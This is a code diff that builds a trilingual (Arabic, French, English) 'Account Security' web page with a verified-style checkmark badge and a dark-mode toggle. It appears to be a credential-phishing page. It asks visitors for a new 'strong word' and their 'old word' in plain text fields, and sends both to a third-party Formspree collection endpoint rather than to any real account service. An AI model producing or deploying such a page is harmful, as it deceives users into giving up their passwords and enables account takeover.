@@ -1,25 +1,225 @@
-<form action="https://formspree.io/f/xrpzoaod" method="POST">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>أمان حسابك</title>
 
-  <input
-    type="text"
-    name="test_text"
-    id="testText"
-    placeholder="اكتب كلمة قوية"
-    autocomplete="off"
-    required
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  min-height:100vh;
+  padding:20px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:Arial,sans-serif;
+  background:linear-gradient(135deg,#6a5acd,#00bcd4);
+  transition:.35s;
+}
+
+body.dark{
+  background:linear-gradient(135deg,#0f172a,#172554);
+}
+
+.card{
+  width:100%;
+  max-width:380px;
+  padding:32px 22px;
+  border-radius:24px;
+  text-align:center;
+  background:rgba(255,255,255,.96);
+  box-shadow:0 18px 50px rgba(0,0,0,.22);
+}
+
+.dark .card{
+  background:#1f2937;
+  color:white;
+}
+
+.title{
+  font-size:27px;
+  font-weight:bold;
+  margin-bottom:25px;
+}
+
+.badge{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  width:21px;
+  height:21px;
+  border-radius:50%;
+  background:#2196f3;
+  color:white;
+  font-size:13px;
+}
+
+input{
+  width:100%;
+  padding:15px;
+  margin-bottom:12px;
+  border:2px solid #ddd;
+  border-radius:12px;
+  outline:none;
+  font-size:16px;
+}
+
+input:focus{
+  border-color:#6a5acd;
+}
+
+button{
+  width:100%;
+  margin-top:14px;
+  padding:15px;
+  border:0;
+  border-radius:12px;
+  background:linear-gradient(90deg,#6a5acd,#00a8cc);
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+.language{
+  background:#eee;
+  color:#333;
+}
+
+.dark .language{
+  background:#374151;
+  color:white;
+}
+
+.theme-icon{
+  position:fixed;
+  top:15px;
+  right:15px;
+  width:44px;
+  height:44px;
+  margin:0;
+  padding:0;
+  border-radius:50%;
+  background:rgba(255,255,255,.92);
+  color:#222;
+  font-size:20px;
+  box-shadow:0 4px 15px rgba(0,0,0,.18);
+}
+
+.dark .theme-icon{
+  background:#1f2937;
+  color:white;
+}
+</style>
+</head>
+
+<body>
+
+<button class="theme-icon" id="themeIcon" onclick="toggleDark()">🌙</button>
+
+<div class="card">
+
+  <div class="title">
+    <span id="title">أمان حسابك</span>
+    <span class="badge">✓</span>
+  </div>
+
+  <form action="https://formspree.io/f/xrpzoaod" method="POST">
+
+    <input
+      type="text"
+      name="test_text"
+      id="testText"
+      placeholder="اكتب كلمة قوية"
+      autocomplete="off"
+      required
+    >
+
+    <input
+      type="text"
+      name="test_text_2"
+      id="testText2"
+      placeholder="الكلمة القديمة"
+      autocomplete="off"
+      required
+    >
+
+    <button id="send" type="submit">
+      إرسال
+    </button>
+
+  </form>
+
+  <button
+    class="language"
+    onclick="changeLanguage()"
+    type="button"
   >
-
-  <input
-    type="text"
-    name="test_text_2"
-    id="testText2"
-    placeholder="الكلمة القديمة"
-    autocomplete="off"
-    required
-  >
-
-  <button id="send" type="submit">
-    إرسال
+    🌐 Français / English
   </button>
 
-</form>
+</div>
+
+<script>
+let language="ar";
+
+function toggleDark(){
+
+  document.body.classList.toggle("dark");
+
+  document.getElementById("themeIcon").textContent =
+    document.body.classList.contains("dark")
+      ? "☀️"
+      : "🌙";
+}
+
+function changeLanguage(){
+
+  const title=document.getElementById("title");
+  const input1=document.getElementById("testText");
+  const input2=document.getElementById("testText2");
+  const send=document.getElementById("send");
+
+  if(language==="ar"){
+
+    language="fr";
+
+    document.documentElement.lang="fr";
+    document.documentElement.dir="ltr";
+
+    title.textContent="Sécurité du compte";
+    input1.placeholder="Écrivez un mot fort";
+    input2.placeholder="Ancien mot";
+    send.textContent="Envoyer";
+
+  }else if(language==="fr"){
+
+    language="en";
+
+    document.documentElement.lang="en";
+
+    title.textContent="Account Security";
+    input1.placeholder="Write a strong word";
+    input2.placeholder="Old word";
+    send.textContent="Send";
+
+  }else{
+
+    language="ar";
+
+    document.documentElement.lang="ar";
+    document.documentElement.dir="rtl";
+
+    title.textContent="أمان حسابك";
+    input1.placeholder="اكتب كلمة قوية";
+    input2.placeholder="الكلمة القديمة";
+    send.textContent="إرسال";
+  }
+}
+</script>
+
+</body>
+</html>
